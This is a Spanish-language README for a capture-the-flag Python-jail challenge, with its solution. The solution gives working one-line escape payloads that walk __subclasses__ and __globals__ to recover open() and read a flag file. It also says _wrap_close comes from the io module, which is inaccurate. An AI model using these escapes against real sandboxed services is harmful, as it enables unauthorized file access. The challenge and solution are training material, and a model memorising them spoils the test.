# medium-misc-pyjail

**Categoria:** Misc  
**Dificultad:** Media  
**Puertos:** 9999 (jail interactivo) | 80 (info web)

---

## Descripcion

Un interprete Python con builtins restringidos corre dentro de un contenedor.
La flag esta en `/home/ctf/flag.txt`. El objetivo es leerla sin tener acceso a
`open()`, `exec()`, `__import__` ni la mayoria de builtins peligrosos.

Builtins habilitados:
`abs`, `bin`, `bool`, `bytes`, `chr`, `dict`, `dir`, `getattr`, `hasattr`,
`hex`, `id`, `int`, `isinstance`, `len`, `list`, `oct`, `ord`, `print`,
`range`, `repr`, `str`, `tuple`, `type`, `vars`

---

## Concepto de resolucion

Python expone su jerarquia de clases completa a traves de introspección incluso
cuando los builtins estan restringidos. El truco esta en escalar desde cualquier
objeto hasta `object` y luego recorrer todas sus subclases:

```python
().__class__.__base__.__subclasses__()
```

Esto retorna todas las subclases de `object` cargadas en el interprete.
Entre ellas existe `_wrap_close` (modulo `io`), cuyo `__init__.__globals__`
contiene la funcion `open` nativa del interprete — sin importarla explicitamente.

---

## Solucion paso a paso

### 1. Conectarse al jail

```bash
nc <host> 9999
```

### 2. Explorar la jerarquia (opcional, para entender)

```python
>>> type(().__class__.__base__)
>>> len(().__class__.__base__.__subclasses__())
```

### 3. Payload de escape — leer la flag directamente

```python
>>> [c for c in ().__class__.__base__.__subclasses__() if hasattr(c,'__init__') and hasattr(c.__init__,'__globals__') and 'open' in c.__init__.__globals__][0].__init__.__globals__['open']('/home/ctf/flag.txt').read()
```

### 4. Alternativa con clase especifica

```python
>>> [c for c in ().__class__.__base__.__subclasses__() if c.__name__=='_wrap_close'][0].__init__.__globals__['open']('/home/ctf/flag.txt').read()
```

---

## Script automatizado

```bash
python3 solve.py HOST=<ip> PORT=9999
```

Requiere `pwntools`: `pip install pwntools`

---

## Despliegue

```bash
docker-compose up --build
```

La FLAG es inyectada via variable de entorno al contenedor y escrita en
`/home/ctf/flag.txt` al arrancar.

---

## Referencia tecnica

- La cadena `__subclasses__` funciona porque la restriccion de builtins solo
  impide llamar funciones directamente por nombre; la introspección de objetos
  existentes nunca se bloquea en CPython.
- `_wrap_close` siempre esta disponible porque el modulo `io` se carga antes
  que cualquier script de usuario en CPython 3.x.
